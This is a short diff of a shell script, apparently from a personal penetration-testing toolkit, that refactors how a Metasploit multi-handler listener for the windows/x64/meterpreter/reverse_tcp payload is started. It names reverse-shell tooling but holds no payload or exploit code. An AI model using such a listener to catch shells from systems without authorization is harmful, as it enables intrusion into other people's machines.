@@ -4,5 +4,8 @@
 meterpreter: start meterpreter listener windows/x64/meterpreter/reverse_tcp
 '
 
+source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh
+
 PAYLOAD="windows/x64/meterpreter/reverse_tcp"
-bash ~/Desktop/base/code/xdotool/scripts/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh "${PAYLOAD}"
+
+create_meterpreter_multi_handler "${PAYLOAD}"
